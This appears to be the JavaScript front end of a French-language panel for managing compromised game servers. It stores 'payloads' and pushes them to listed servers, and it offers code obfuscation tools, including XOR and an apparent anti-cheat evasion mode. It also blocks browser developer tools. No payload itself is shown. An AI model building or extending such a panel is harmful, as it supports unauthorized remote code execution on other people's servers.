var action_server_id;
var action_payload_id;
var call_check_timer;

var server_table = $("#server_list").DataTable({
    responsive: true,
    bStateSave: true,
    "language": {
        "lengthMenu": "Afficher _MENU_ serveurs",
        "zeroRecords": "Aucun serveur trouvée",
        "info": "Affiché _PAGE_ pages sur _PAGES_",
        "infoEmpty": "Aucun serveur n'a été trouvé",
        "infoFiltered": "(filtré pour _MAX_ serveurs)"
    },
    ajax: "core/ajax/get-server.php"
});

var all_server_table = $("#all_server_list").DataTable({
    responsive: true,
    bStateSave: true,
    "language": {
        "lengthMenu": "Afficher _MENU_ serveurs",
        "zeroRecords": "Aucun serveur trouvée",
        "info": "Affiché _PAGE_ pages sur _PAGES_",
        "infoEmpty": "Aucun serveur n'a été trouvé",
        "infoFiltered": "(filtré pour _MAX_ serveurs)"
    },
    ajax: "core/ajax/get-server-admin.php"
});

var users_table = $("#users_list").DataTable({
    responsive: true,
    bStateSave: true,
    language: {
        "lengthMenu": "Afficher _MENU_ utilisateurs",
        "zeroRecords": "Aucune utilisateur trouvée",
        "info": "Affiché _PAGE_ pages sur _PAGES_",
        "infoEmpty": "Aucune utilisateur n'a été trouvé",
        "infoFiltered": "(filtré pour _MAX_ utilisateurs)"
    },
    ajax: "core/ajax/get-users.php"
});

var users_waiting_table = $("#users_waiting_list").DataTable({
    responsive: true,
    bStateSave: true,
    language: {
        "lengthMenu": "Afficher _MENU_ utilisateurs",
        "zeroRecords": "Aucune utilisateur trouvée",
        "info": "Affiché _PAGE_ pages sur _PAGES_",
        "infoEmpty": "Aucune utilisateur n'a été trouvé",
        "infoFiltered": "(filtré pour _MAX_ utilisateurs)"
    },
    ajax: "core/ajax/get-users-waiting.php"
});

var payload_table = $("#payload_list").DataTable({
    responsive: true,
    bStateSave: true,
    "language": {
        "lengthMenu": "Afficher _MENU_ payloads",
        "zeroRecords": "Aucun payload trouvée",
        "info": "Affiché _PAGE_ pages sur _PAGES_",
        "infoEmpty": "Aucun payload n'a été trouvé",
        "infoFiltered": "(filtré pour _MAX_ payloads)"
    },
    ajax: "core/ajax/get-payload.php"
});
/*
var shared_table = $("#shared_list").DataTable({
    responsive: true,
    bStateSave: true,
    "language": {
        "lengthMenu": "Afficher _MENU_ payloads",
        "zeroRecords": "Aucun payload trouvée",
        "info": "Affiché _PAGE_ pages sur _PAGES_",
        "infoEmpty": "Aucun payload n'a été trouvé",
        "infoFiltered": "(filtré pour _MAX_ payloads)"
    },
    ajax: "core/ajax/get-shared.php"
})*/

function deleteServer(id)
{
    $.ajax({
      url: "core/ajax/del-server.php?id=" + id
    });
}

function deleteUser(id)
{
    $.ajax({
      url: "core/ajax/del-user.php?id=" + id
    });
}

function deletePayload(id)
{
    $.ajax({
      url: "core/ajax/del-payload.php?id=" + id
    });
}

function createPayload()
{
    var payload_name = $("#payload-name").val();
    var payload_comment = $("#payload-comment").val();
    var payload_content = $("#payload-text").val().replace("\n", "<NEWLINE>");;

    $.ajax({
      method: "POST",
      url: "core/ajax/add-payload.php",
      data: { name: payload_name, comment: payload_comment, content: payload_content }
    });

    // $("#createpayload-modal").modal("hide");
    $("#payload-name").val("");
    $("#payload-text").val("");
    $("#payload-comment").val("");
}

$('#createpayload-modal').on('hidden.bs.modal', function () {
    $("#payload-name").val("");
    $("#payload-text").val("");
    $("#payload-comment").val("");
});

function sharePayload()
{
    var payload_name = $("#shared-name").val();
    var payload_comment = $("#shared-comment").val();
    var payload_content = $("#shared-text").val().replace("\n", "<NEWLINE>");;

    $.ajax({
      method: "POST",
      url: "core/ajax/add-shared.php",
      data: { name: payload_name, comment: payload_comment, content: payload_content }
    });

    // $("#createpayload-modal").modal("hide");
    $("#shared-name").val("");
    $("#shared-text").val("");
    $("#shared-comment").val("");
}

$('#sharepayload-modal').on('hidden.bs.modal', function () {
    $("#shared-name").val("");
    $("#shared-text").val("");
    $("#shared-comment").val("");
});


function AddMessage()
{
    var message = $("#message").val();
    $.ajax({
        method: "POST",
        url: "core/ajax/add-message.php",
        data: { message: message }
    });

    $("#message").val("");
}

function createShared()
{
    var payload_name = $("#shared-name").val();
    var payload_comment = $("#shared-comment").val();
    var payload_content = $("#shared-text").val().replace("\n", "<NEWLINE>");;

    $.ajax({
      method: "POST",
      url: "core/ajax/add-shared.php",
      data: { name: payload_name, comment: payload_comment, content: payload_content }
    });

    // $("#createpayload-modal").modal("hide");
    $("#shared-name").val("");
    $("#shared-text").val("");
    $("#shared-comment").val("");
}

$('#createshared-modal').on('hidden.bs.modal', function () {
    $("#shared-name").val("");
    $("#shared-text").val("");
    $("#shared-comment").val("");
});

function createUser()
{
    var username = $("#users-username").val();
    var password = $("#users-password").val();
    var cpassword = $("#users-cpassword").val();
    var mail = $("#users-mail").val();

    $.ajax({
      url: "core/ajax/add-an-user-from-ajax.php?usernamer=" + username + "&passwordr=" + password + "&cpasswordr=" + cpassword + "&mail=" + mail
    }).done(function(data){
        if (data == "success")
        {
            // $("#createusers-modal").modal("hide");
        }
        else
        {
            $("#users-notify").remove();
            $("#createusers-body").prepend($('<div class="alert alert-danger" role="alert" id="users-notify">'+data+'</div>').fadeIn('slow'));
        }
    });
}

$('#createusers-modal').on('hidden.bs.modal', function () {
    $("#users-notify").remove();
    $("#users-username").val("");
    $("#users-password").val("");
    $("#users-cpassword").val("");
});

function viewPayload(id)
{
    action_payload_id = id;
    $.ajax({
      url: "core/ajax/get-payload-content.php?id=" + id
    }).done(function(data){
        console.log(data);
        $("#edit-payload-name").val(data.payload_name);
        $("#edit-payload-comment").val(data.payload_comment);
        $("#edit-payload-text").val(data.payload_content);
        $("#viewpayload-modal").modal("show");
    });
}

function viewShared(id)
{
    action_payload_id = id;
    $.ajax({
      url: "core/ajax/get-payload-content.php?id=" + id
    }).done(function(data){
        console.log(data);
        $("#edit-shared-name").val(data.payload_name);
        $("#edit-shared-comment").val(data.payload_comment);
        $("#edit-shared-text").val(data.payload_content);
        $("#viewsharedpayload-modal").modal("show");
    });
}

function ClearLog()
{
    $.ajax({
      url: "core/ajax/del-logs.php"
    });
}
function ClearChat()
{
    $.ajax({
      url: "core/ajax/del-chat.php"
    });
}
function editPayload()
{
    var name = $("#edit-payload-name").val();
    var comment = $("#edit-payload-comment").val();
    var text = $("#edit-payload-text").val().replace("\n", "<NEWLINE>");

    $.ajax({
      method: "POST",
      url: "core/ajax/edit-payload.php?id=" + action_payload_id,
      data: { name: name, comment: comment, content: text }
    });

    $("#viewpayload-modal").modal("hide");
}

$('#viewpayload-modal').on('hidden.bs.modal', function () {
    $("#edit-payload-name").val("");
    $("#edit-payload-comment").val("");
    $("#edit-payload-text").val("");
});

function showcallPayload(id)
{
    action_server_id = id;
    $.ajax({
      url: "core/ajax/get-payload-name.php"
    }).done(function(data){ 
        $("#server-payload").html("");
        $.each(data, function(i, item) {
            $("#server-payload").append("<option value=\"" + item.id + "\">" + item.payload_name + "</option>");
        });
        $("#serverpayload-modal").modal("show");
    });
}

function showcallPayloadadmin(id)
{
    action_server_id = id;
    $.ajax({
      url: "core/ajax/get-payload-name.php"
    }).done(function(data){ 
        $("#allserver-payload").html("");
        $.each(data, function(i, item) {
            $("#allserver-payload").append("<option value=\"" + item.id + "\">" + item.payload_name + "</option>");
        });
        $("#allserverpayload-modal").modal("show");
    });
}

function showrole(id)
{
    action_user_id = id;
    $("#setrole-modal").modal("show");
}

function setrole()
{
    var role_id = $("#user-role").val();
    $.ajax({
      url: "core/ajax/set-user-role.php?roletoset=" + role_id + "&usertoupg=" + action_user_id,
    });
    $("#setrole-modal").modal("hide");
}

function callPayload()
{
    var payload_id = $("#server-payload").val();
    $.ajax({
      url: "core/ajax/call-payload.php?server=" + action_server_id + "&payload=" + payload_id
    });
    $("#serverpayload-body").html('<h3 class="text-center red-text"><i class="fa fa-volume-control-phone"></i>&nbsp;En attente de réponse du serveur ...</h3>');
    $("#serverpayload-footer").html('');
    checkCallStatut();
}

function callPayloadAdmin()
{
    var payload_id = $("#allserver-payload").val();
    $.ajax({
      url: "core/ajax/call-payload.php?server=" + action_server_id + "&payload=" + payload_id
    });
    $("#allserverpayload-body").html('<h3 class="text-center red-text"><i class="fa fa-volume-control-phone"></i>&nbsp;En attente de réponse du serveur ...</h3>');
    $("#allserverpayload-footer").html('');
    checkCallStatutAdmin();
}

function resetkey(id)
{
    action_user_id = id;
    $.ajax({
      method: "POST",
      url: "core/ajax/resetkey.php",
      data: { id: id }
    });
}

function validate(id)
{
    action_user_id = id;
    $.ajax({
      method: "POST",
      url: "core/ajax/validate.php",
      data: { id: id }
    });
}

function checkCallStatut()
{
    call_check_timer = setInterval(function(){
        $.ajax({
            url: "core/ajax/call-statut.php?server=" + action_server_id
        }).done(function(data){
            if (data == 'success')
            {
                $('#serverpayload-body').html('<h3 class="text-success text-center"><i class="fa fa-check"></i>&nbsp; Le payload à été chargé avec succées</h3>');
                clearInterval(call_check_timer);
            }
        });
    }, 0.5 * 1000);
}

function checkCallStatutAdmin()
{
    call_check_timer = setInterval(function(){
        $.ajax({
            url: "core/ajax/call-statut.php?server=" + action_server_id
        }).done(function(data){
            if (data == 'success')
            {
                $('#allserverpayload-body').html('<h3 class="text-success text-center"><i class="fa fa-check"></i>&nbsp; Le payload à été chargé avec succées</h3>');
                clearInterval(call_check_timer);
            }
        });
    }, 0.5 * 1000);
}

$('#serverpayload-modal').on('hidden.bs.modal', function () {
    $("#serverpayload-body").html('<div class="form-group"><label>Payload</label><select class="form-control" id="server-payload"></select></div>');
    $("#serverpayload-footer").html('<button type="button" class="btn btn-danger" data-dismiss="modal">Annulé</button><button type="button" onclick="callPayload()" class="btn btn-primary">Chargé le Payload</button>');
});

$('#allserverpayload-modal').on('hidden.bs.modal', function () {
    $("#allserverpayload-body").html('<div class="form-group"><label>Payload</label><select class="form-control" id="allserver-payload"></select></div>');
    $("#allserverpayload-footer").html('<button type="button" class="btn btn-danger" data-dismiss="modal">Annulé</button><button type="button" onclick="callPayloadAdmin()" class="btn btn-primary">Chargé le Payload</button>');
});

function UpdateLogs()
{
    $.ajax({
        url: "core/ajax/get-logs.php"
    }).done(function(data){
        $('#logs-body').html(data);
    });
}

function GetBackdoor()
{
    addonfile = $("#addonfile").serialize();
    $.ajax({
        type: "POST",
        url: "core/ajax/backcheck.php",
        data: { addonfile: addonfile }
    }).done(function(data){
        $('#backdoor-footer').html(data);
    });
}

function UpdateChat()
{
    $.ajax({
        url: "core/ajax/get-chat.php"
    }).done(function(data){
        $('#chat-body').html(data);
    });
}

function UpdateParams()
{
    $.ajax({
        url: "core/ajax/get-params.php"
    }).done(function(data){
        $('#params-delay').val(data[0].value);
    });
}

// Execute une mise à jour toute les 1 secondes
setInterval(function(){
    server_table.ajax.reload(function(){
              $(".paginate_button > a").on("focus", function(){
                  $(this).blur();
              });
          }, false);
    users_table.ajax.reload(function(){
              $(".paginate_button > a").on("focus", function(){
                  $(this).blur();
              });
          }, false);
    users_waiting_table.ajax.reload(function(){
              $(".paginate_button > a").on("focus", function(){
                  $(this).blur();
              });
          }, false);
    payload_table.ajax.reload(function(){
              $(".paginate_button > a").on("focus", function(){
                  $(this).blur();
              });
          }, false);
    all_server_table.ajax.reload(function(){
              $(".paginate_button > a").on("focus", function(){
                  $(this).blur();
              });
          }, false);
    /*
    shared_table.ajax.reload(function(){
              $(".paginate_button > a").on("focus", function(){
                  $(this).blur();
              });
          }, false);*/
    UpdateLogs();
    UpdateChat();
}, 0.5 * 1000);

setInterval(function(){
    UpdateParams();
}, 1 * 1000);

$('#params-delay').bind('click keyup', function(){
    $.ajax({
        url: "core/ajax/set-delay.php?delay=" + $(this).val()
    });
});

$.fn.dataTableExt.sErrMode = 'throw';

function obfuscate()
{
    var code = $("#obfuscation-text").val().replace("\n", "<NEWLINE>");;

    $.ajax({
      method: "POST",
      url: "core/ajax/obfuscate.php",
      data: { code: code }
    }).done(function(data){
        $("#obfuscation-text").val(data);
    });
}

function obfuscategvac()
{
    var code = $("#obfuscation-gvac-text").val().replace("\n", "<NEWLINE>");;

    $.ajax({
      method: "POST",
      url: "core/ajax/gvacobfu.php",
      data: { code: code }
    }).done(function(data){
        $("#obfuscation-gvac-text").val(data);
    });
}

function deobfuscatexor()
{
    var code = $("#deobfuscation-text").val();

    $.ajax({
      method: "POST",
      url: "core/ajax/xor.php",
      data: { code: code }
    }).done(function(data){
        $("#deobfuscation-text").val(data);
    });
}

function obfuscatexor()
{
    var code = $("#xorobfuscation-text").val();

    $.ajax({
      method: "POST",
      url: "core/ajax/codetoxor.php",
      data: { code: code }
    }).done(function(data){
        $("#xorobfuscation-text").val(data);
    });
}

function obfuscatexor2()
{
    var code = $("#xorobfuscation2-text").val();

    $.ajax({
      method: "POST",
      url: "core/ajax/codetoxor2.php",
      data: { code: code }
    }).done(function(data){
        $("#xorobfuscation2-text").val(data);
    });
}

window.onload = function() {
    document.addEventListener("contextmenu", function(e){
      e.preventDefault();
    }, false);
    document.addEventListener("keydown", function(e) {
    //document.onkeydown = function(e) {
      // "I" key
      if (e.ctrlKey && e.shiftKey && e.keyCode == 73) {
        disabledEvent(e);
      }
      // "J" key
      if (e.ctrlKey && e.shiftKey && e.keyCode == 74) {
        disabledEvent(e);
      }
      // "S" key + macOS
      if (e.keyCode == 83 && (navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)) {
        disabledEvent(e);
      }
      // "U" key
      if (e.ctrlKey && e.keyCode == 85) {
        disabledEvent(e);
      }
      // "F12" key
      if (event.keyCode == 123) {
        disabledEvent(e);
      }
    }, false);
    function disabledEvent(e){
      if (e.stopPropagation){
        e.stopPropagation();
      } else if (window.event){
        window.event.cancelBubble = true;
      }
      e.preventDefault();
      return false;
    }
  }; 